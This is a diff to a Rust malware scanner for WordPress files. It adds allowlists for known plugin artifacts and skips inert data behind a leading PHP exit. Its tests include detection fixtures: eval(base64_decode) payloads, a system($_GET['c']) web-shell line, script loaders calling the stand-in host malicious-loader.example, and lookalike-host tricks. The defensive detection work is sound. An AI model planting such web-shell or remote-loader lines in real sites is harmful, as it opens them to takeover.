@@ -17,7 +17,7 @@ use std::sync::LazyLock;
 use regex::bytes::{Regex, RegexSet, RegexSetBuilder};
 
 /// Bumped whenever a rule changes; a bump re-inspects the Layer B scope once.
-pub const RULE_PACK_VERSION: u32 = 5;
+pub const RULE_PACK_VERSION: u32 = 6;
 
 /// Bytes of one file that are inspected. A larger inspected file (PHP,
 /// JavaScript, HTML, PHP settings) is reported as `too_large_to_inspect` (never
@@ -105,6 +105,54 @@ const BIG_LITERAL: &str = r#"['"][A-Za-z0-9+/=]{3000,}['"]"#;
 const ENCODED_MEDIA: &str =
     r#"(?-u)^['"](?:PHN2Zy|PD94bWw|iVBORw0KGgo|R0lGOD|/9j/|UklGR|d09GRg|d09GMg)"#;
 const PAYLOAD_LITERAL: &str = r#"['"][A-Za-z0-9+/=]{256,}['"]"#;
+
+/// Hosts of support widgets that plugins load on their own admin screens: WP
+/// Rocket's settings page embeds Help Scout's Beacon. A plain script loader for
+/// one of these, by exact host, is no finding; for any other host it stays
+/// Medium, and a self-removing loader stays High whatever its host.
+const KNOWN_WIDGET_HOSTS: [&str; 1] = ["beacon-v2.helpscout.net"];
+
+/// `<?php exit;` (or `die`, with an optional single-quoted message or an exit
+/// code) as the very first statement, then `__halt_compiler();` or `?>`. PHP
+/// stops at the exit, and after `__halt_compiler()` doesn't even parse the rest.
+/// Wordfence opens every file under `wflogs/` so and keeps serialized data
+/// after it. A double-quoted message could interpolate code, so it isn't one.
+#[allow(clippy::expect_used)]
+static INERT_HEAD: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"(?i-u)\A<\?php[ \t\r\n]+(?:exit|die)[ \t]*(?:\([ \t]*(?:'[^'\\\r\n]{0,128}'|[0-9]{1,3})?[ \t]*\))?[ \t]*(?:;[ \t\r\n]*__halt_compiler[ \t]*\([ \t]*\)[ \t]*;|;?[ \t]*\?>)",
+    )
+    .expect("inert head regex")
+});
+
+/// Bytes of a PHP file before anything that can't run: the whole file unless it
+/// opens with an exit (see [`INERT_HEAD`]).
+fn runnable_len(bytes: &[u8]) -> usize {
+    INERT_HEAD.find(bytes).map_or(bytes.len(), |m| m.end())
+}
+
+/// A PHP file that runs nothing at all: its first statement is an exit. What
+/// follows is data at most, and code that reads it is code of its own, which
+/// the rules read where it lives.
+pub fn runs_nothing(rel_path: &str, bytes: &[u8]) -> bool {
+    is_php_like(rel_path) && INERT_HEAD.is_match(bytes)
+}
+
+/// The script loader whose host starts at `host_start` loads a known widget
+/// (see [`KNOWN_WIDGET_HOSTS`]). The whole host must be one, and end the URL
+/// or start its path: `@`, `:` or a longer name after it is someone else's.
+fn loads_known_widget(body: &[u8], host_start: usize) -> bool {
+    let rest = &body[host_start.min(body.len())..];
+    let len = rest
+        .iter()
+        .position(|b| !(b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-')))
+        .unwrap_or(rest.len());
+    let (host, after) = rest.split_at(len);
+    matches!(after.first(), Some(b'"' | b'\'' | b'/' | b'\\'))
+        && KNOWN_WIDGET_HOSTS
+            .iter()
+            .any(|k| host.eq_ignore_ascii_case(k.as_bytes()))
+}
 
 /// High rules first: when a file hits the cap, the worst findings survive.
 const RULES: &[Rule] = &[
@@ -438,12 +486,35 @@ pub fn is_wp_all_import_functions(rel_path: &str) -> bool {
     }
 }
 
+/// Really Simple Security's `security/tests/code-execution.php`, byte for byte.
+const RSSSL_CODE_EXECUTION_TEST: &[u8] = b"<?php\n/**\n * Test file for Really Simple Security to check if uploads directory has code execution permissions\n *\n */\n\necho \"RSSSL CODE EXECUTION MARKER\";\n";
+
+/// Really Simple Security's check whether PHP runs under uploads
+/// (`rsssl_code_execution_allowed`): it copies its test file to
+/// `<uploads>/code-execution.php`, requests it, and deletes it, so a request
+/// that never returns leaves it behind. Only its own content, which prints a
+/// marker and nothing else, at that exact place.
+pub fn is_rsssl_code_execution_test(rel_path: &str, bytes: &[u8]) -> bool {
+    let mut parts = rel_path.rsplit('/');
+    if parts.next() != Some("code-execution.php") || bytes != RSSSL_CODE_EXECUTION_TEST {
+        return false;
+    }
+    match parts.next() {
+        Some("uploads") => true,
+        Some(n) if !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit()) => {
+            parts.next() == Some("sites") && parts.next() == Some("uploads")
+        }
+        _ => false,
+    }
+}
+
 /// PHP a known plugin keeps under uploads by design. Not a `php_in_uploads`
 /// finding; the content rules still apply.
 fn is_plugin_php_in_uploads(rel_path: &str, bytes: &[u8]) -> bool {
     is_silence_stub(rel_path, bytes)
         || is_twig_cache(rel_path, bytes)
         || is_wp_all_import_functions(rel_path)
+        || is_rsssl_code_execution_test(rel_path, bytes)
 }
 
 fn is_script_like(rel_path: &str) -> bool {
@@ -495,13 +566,19 @@ pub fn inspect_as_php(rel_path: &str, bytes: &[u8]) -> Vec<RuleHit> {
 fn inspect_with(rel_path: &str, bytes: &[u8], php: bool) -> Vec<RuleHit> {
     let script = php || is_script_like(rel_path);
     let settings = is_php_settings(rel_path);
-    let body = &bytes[..bytes.len().min(INSPECT_MAX_BYTES)];
+    // What PHP never runs is not read: data behind an exit.
+    let runnable = if php {
+        runnable_len(bytes)
+    } else {
+        bytes.len()
+    };
+    let body = &bytes[..runnable.min(INSPECT_MAX_BYTES)];
 
     let mut hits: Vec<RuleHit> = Vec::new();
     if php && under_uploads(rel_path) && !is_plugin_php_in_uploads(rel_path, bytes) {
         hits.push(path_hit("php_in_uploads", Severity::High, rel_path));
     }
-    if (script || settings) && bytes.len() > INSPECT_MAX_BYTES {
+    if (script || settings) && runnable > INSPECT_MAX_BYTES {
         hits.push(path_hit(
             "too_large_to_inspect",
             Severity::Medium,
@@ -536,6 +613,11 @@ fn inspect_with(rel_path: &str, bytes: &[u8], php: bool) -> Vec<RuleHit> {
         let spans: Vec<(usize, usize, Severity)> =
             c.re.find_iter(body)
                 .filter_map(|m| {
+                    if c.rule.id == "js_remote_script"
+                        && loads_known_widget(body, m.end().saturating_sub(1))
+                    {
+                        return None;
+                    }
                     let severity = match &c.guard {
                         None => c.rule.severity,
                         Some((Guard::Near(_), _)) if near.is_empty() => return None,
@@ -1593,5 +1675,130 @@ return () => {
             }
         }
         assert!(started.elapsed().as_secs() < 60, "{:?}", started.elapsed());
+    }
+
+    /// Wordfence's `wfWAFStorageFile`: `LOG_FILE_HEADER`, `LOG_INFO_HEADER`, then
+    /// `serialize()`d config, whose strings hold long base64 (line 6).
+    fn wordfence_config() -> Vec<u8> {
+        let b64 = "DnZWISJXNR5LYjN/Gkh1bW1lPwwfJBApGRMRKzBpKjBXLQIXBFEKKgIoFWwY".repeat(80);
+        format!(
+            "<?php exit('Access denied'); __halt_compiler(); ?>\n\
+             ******************************************************************\n\
+             This file is used by the Wordfence Web Application Firewall. Read \n\
+             more at https://docs.wordfence.com/en/Web_Application_Firewall_FAQ\n\
+             ******************************************************************\n\
+             a:2:{{s:9:\"blob\";s:{}:\"{b64}\";s:4:\"eval\";s:24:\"eval(base64_decode('x'))\";}}",
+            b64.len()
+        )
+        .into_bytes()
+    }
+
+    #[test]
+    fn data_behind_an_exit_is_not_read() {
+        let src = wordfence_config();
+        let h = inspect("wp-content/wflogs/config-transient.php", &src);
+        assert!(h.is_empty(), "{h:?}");
+        assert!(runs_nothing("wp-content/wflogs/config-transient.php", &src));
+        // W3 Total Cache's shape: exit, close tag, data.
+        let w3tc = b"<?php exit; ?>{\"eval\":\"eval(base64_decode('x'))\"}";
+        assert!(inspect("wp-content/w3tc-config/master.php", w3tc).is_empty());
+        assert!(runs_nothing("wp-content/w3tc-config/master.php", w3tc));
+        // Past the inspect limit is still only data.
+        let mut big = src.clone();
+        big.resize(INSPECT_MAX_BYTES + 10, b'A');
+        assert!(inspect("wp-content/wflogs/ips.php", &big).is_empty());
+    }
+
+    #[test]
+    fn code_before_or_in_the_exit_is_read() {
+        let payload = "eval(base64_decode('ZWNobyAxOw=='));";
+        for src in [
+            // Something runs before the exit.
+            format!("<?php {payload} exit; __halt_compiler(); data"),
+            // A double-quoted message interpolates.
+            format!("<?php exit(\"{{${{ {payload} }}}}\"); __halt_compiler(); data"),
+            // No exit: halt_compiler alone ends parsing, not what ran before it.
+            format!("<?php {payload} __halt_compiler(); data"),
+            // An exit that isn't the first thing in the file.
+            format!("\n<?php exit; ?>\n<?php {payload}"),
+            // A conditional exit.
+            format!("<?php if (0) exit; ?><?php {payload}"),
+        ] {
+            let h = inspect("wp-content/wflogs/x.php", src.as_bytes());
+            assert!(ids(&h).contains(&"eval_decoder"), "{src}: {h:?}");
+            assert!(
+                !runs_nothing("wp-content/wflogs/x.php", src.as_bytes()),
+                "{src}"
+            );
+        }
+    }
+
+    #[test]
+    fn an_exit_only_makes_php_inert() {
+        // Served as HTML, the markup after `?>` reaches the browser.
+        let page = b"<?php exit; ?><script src=\"https://malicious-loader.example/x.js\"></script>";
+        assert!(!runs_nothing("wp-content/themes/x/a.html", page));
+        let js = b"<?php exit; ?>var s=document.createElement('script');s.src='https://malicious-loader.example/x.js';";
+        assert!(!inspect("wp-content/themes/x/a.js", js).is_empty());
+    }
+
+    /// WP Rocket's `views/settings/beacon.php`, line 19 as shipped.
+    const HELPSCOUT_BEACON: &str = r#"<script>!function(e,t,n){function a(){var e=t.getElementsByTagName("script")[0],n=t.createElement("script");n.type="text/javascript",n.async=!0,n.src="https://beacon-v2.helpscout.net",e.parentNode.insertBefore(n,e)}if(e.Beacon=n=function(t,n,a){e.Beacon.readyQueue.push({method:t,options:n,data:a})},n.readyQueue=[],"complete"===t.readyState)return a();e.attachEvent?e.attachEvent("onload",a):e.addEventListener("load",a,!1)}(window,document,window.Beacon||function(){});"#;
+
+    #[test]
+    fn help_scouts_beacon_loader_is_clean() {
+        let src = format!("<?php defined( 'ABSPATH' ) || exit; ?>\n{HELPSCOUT_BEACON}</script>");
+        let h = inspect(
+            "wp-content/plugins/wp-rocket/views/settings/beacon.php",
+            src.as_bytes(),
+        );
+        assert!(h.is_empty(), "{h:?}");
+    }
+
+    #[test]
+    fn a_host_that_only_looks_like_help_scout_still_counts() {
+        for host in [
+            "beacon-v2.helpscout.net.malicious-loader.example",
+            "beacon-v2.helpscout.net@malicious-loader.example",
+            "beacon-v2.helpscout.net:8443",
+            "evil-beacon-v2.helpscout.net",
+            HOST,
+        ] {
+            let src = HELPSCOUT_BEACON.replace("beacon-v2.helpscout.net", host);
+            let h = inspect("wp-content/themes/x/a.js", src.as_bytes());
+            assert_eq!(ids(&h), ["js_remote_script"], "{host}: {h:?}");
+        }
+        // A self-removing loader stays High whatever host it names.
+        let src = br#"var s=document.createElement('script');s.src='https://beacon-v2.helpscout.net';document.head.appendChild(s);s.remove();"#;
+        assert_eq!(worst(&inspect("a.js", src)), Some(Severity::High));
+    }
+
+    #[test]
+    fn really_simple_securitys_test_file_is_not_php_in_uploads() {
+        let rel = "wp-content/uploads/code-execution.php";
+        assert!(inspect(rel, RSSSL_CODE_EXECUTION_TEST).is_empty());
+        assert!(inspect(
+            "wp-content/uploads/sites/3/code-execution.php",
+            RSSSL_CODE_EXECUTION_TEST
+        )
+        .is_empty());
+        // Anything added to it, or the same file elsewhere under uploads, is.
+        let mut more = RSSSL_CODE_EXECUTION_TEST.to_vec();
+        more.extend_from_slice(b"system($_GET['c']);\n");
+        assert!(ids(&inspect(rel, &more)).contains(&"php_in_uploads"));
+        assert_eq!(
+            ids(&inspect(
+                "wp-content/uploads/2026/11/code-execution.php",
+                RSSSL_CODE_EXECUTION_TEST
+            )),
+            ["php_in_uploads"]
+        );
+        assert_eq!(
+            ids(&inspect(
+                "wp-content/uploads/x.php",
+                RSSSL_CODE_EXECUTION_TEST
+            )),
+            ["php_in_uploads"]
+        );
     }
 }
